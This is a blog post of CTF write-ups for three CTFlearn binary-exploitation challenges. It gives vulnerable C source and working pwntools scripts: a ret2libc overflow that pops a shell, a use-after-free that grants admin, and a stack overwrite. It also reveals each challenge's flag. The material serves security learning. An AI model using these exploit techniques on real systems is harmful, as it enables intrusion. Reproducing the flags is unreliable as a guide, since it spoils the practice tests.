+++
title = "CTFLearn Binary"
date = 2022-02-19
description = "Here's some writeups from the binary category on ctflearn.com/"
+++

### Table of Contents:

<div class="toc">

- [Shell Time!](#shell-time)
- [Poor Login](#poor-login)
- [Blackbox](#blackbox)


</div>

<center>

## Shell Time!

</center>

```
nc thekidofarcrania.com 4902
```

In a previous challenge, RIP my BOF, we were given the binary for the server and bof2.c. Whereas RIP my BOF needed flag.txt and wanted us to overwrite the instruction pointer with the address of win(), Shell Time! wants us to find flag2.txt. 


Source:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);

void win() {
  system("/bin/cat /flag.txt");
}

void vuln() {
  char padding[16];
  char buff[32];

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  vuln();
}

```

I first leaked the address of puts. 

```python
payload = b'a'*(60) + p32(elf.plt['puts']) + p32(elf.symbols['main']) + p32(elf.got['puts'])
```

Once I had the address, I used https://libc.rip/ to leak the address of libc. With this, I then got the addresses for system and /bin/sh.

```
libc_addr = puts_addr - 0x67b40
system_addr = libc_addr + 0x3d200
bin_sh_addr = libc_addr + 0x17e0cf
```

I then sent the second payload (junk + system + junk + binsh), and from there, I got the shell and cat out flag2.txt

Solve:

```python
from pwn import *

elf = context.binary = ELF('./server')
p = remote("thekidofarcrania.com", 4902)

p.recvuntil(b"text:")

# Leaks the address of puts
payload = b'a'*(48+12) + p32(elf.plt['puts']) + p32(elf.symbols['main']) + p32(elf.got['puts'])
p.sendline(payload)

p.recvuntil(b"address: ")
p.recvline()
p.recvline()
puts_addr = u32(p.recv(4))

# Once we have the address of puts, we can leak libc

libc_addr = puts_addr - 0x67b40
system_addr = libc_addr + 0x3d200
bin_sh_addr = libc_addr + 0x17e0cf

p.recvuntil(b"text: ")
payload = b'a'*(48+12) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
p.sendline(payload)

# We now have a shell
p.sendline(b'cat flag2.txt')

p.interactive()
```

<details>
  <summary id="reveal-flag">Reveal Flag</summary>
  <p id="flag">CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}</p>
</details>

___

<center>

## Poor Login

</center>

h e a p 

<details>
  <summary id="source">View Source</summary>
  
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int menu() {
  printf("*** WINBLOWS LOGIN *********\n"
      "1. Login into user.\n"
      "2. Sign out.\n"
      "3. Print flag.\n"
      "4. Lock user.\n"
      "5. Restore user.\n"
      "> ");
  
  int resp = 0;
  scanf("%d", &resp);
  while (getchar() != '\n');
  return resp;
}

struct creds {
  void *padding;
  char name[32];
  int admin;
};


struct creds *curr;
struct creds *save;

char *fake_flag;

int main() {
  char buff[64];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);

  while (1) {
    switch (menu()) {
      case 1:  // Login
        curr = malloc(sizeof(*curr));

        printf("Username: ");
        fgets(curr->name, sizeof(curr->name), stdin);
        strtok(curr->name, "\n");

        curr->admin = 0; 
        break;
      case 2: // Sign out
        if (!curr) {
          puts("You are not logged in!");
          break;
        }
        free(curr);
        curr = NULL;
        puts("You have been successfully logged out.");
        break;
      case 3: // Print flag
        if (curr && curr->admin) {
          puts("Here's your flag:");
          system("/bin/cat /flag.txt");
        } else {
          if (!fake_flag) {
            puts("You are not admin. Would you like to create a new flag instead?");
            fgets(buff, sizeof(buff), stdin);
            fake_flag = strdup(buff);
          }
          printf("Here's your flag: %s", fake_flag);
        }
        break;
      case 4: // Lock user
        if (curr == NULL) {
          puts("You are not logged in!");
          break;
        }

        puts("User has been locked now.");
        save = curr; 
        break;
      case 5: // Restore user
        if (curr != NULL) {
          puts("You are already logged. Sign out first!");
        } else if (save == NULL) {
          puts("No user is currently locked!");
        } else {
          printf("Welcome back, %s!\n", save->name);
          curr = save;
          save = NULL;
        }
        break;
      default:
        puts("Invalid choice");
    }
  }
}
```
</details>

After seeing free and malloc, I figured it was use after free time 😎

```python
from pwn import *

# nc thekidofarcrania.com 13226

p = remote("thekidofarcrania.com", 13226)
# p = process('./login')

p.sendline(b'1')  # sends username  
p.sendline(b'username')

p.sendline(b'4') # locks user

p.sendline(b'2') # signs out 
# signing out frees curr 

p.sendline(b'3') # make a fakeflag

# creds buffer = 32 
p.sendline(b'a'*39 + b'1') # send fakeflag
# 1 at the end so we set 1 for admin

p.sendline(b'5') # restores user

p.sendline(b'3') # prints flag

p.interactive()
```

<details>
  <summary id="reveal-flag">Reveal Flag</summary>
  <p id="flag">CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}</p>
</details>

___

<center>

## Blackbox

</center>

```
ssh blackbox@104.131.79.111 -p 1001
```

Once we ssh, we can see a binary named blackbox and flag.txt. We don't have permission to read flag.txt, and if we run the binary we are greeted with this:

```
What is 1 + 1 =
```

And if we try to answer 2, we see something like this:

```
What is 1 + 1 = 2
No dummy... 1 + 1 != 0...
```

So, how do we get it to not say "1 + 1 != 0..."?

I honestly solved this challenge with trial and error. I first tried to find the buffer, and once I was able to see how I could modify values, I adjusted so that 1 + 1 would be set to 2. 

```python
from pwn import *

s = ssh('blackbox', '104.131.79.111', port=1001, password='guest')
sh = s.run('sh')

sh.sendline(b'./blackbox')

sh.sendline(b'a'*80 + p32(2))

# trial and error time 
# b'a'*81 => 1 + 1 != 97
# b'a'*88 => 1 + 1 != 1633771873
# b'a'*89 => stack smashing detected

sh.recvline()
log.success('Flag: ' + sh.recvline().decode("utf-8"))
```

<details>
  <summary id="reveal-flag">Reveal Flag</summary>
  <p id="flag">flag{0n3_4lus_1_1s_Tw0_dumm13!!}</p>
</details>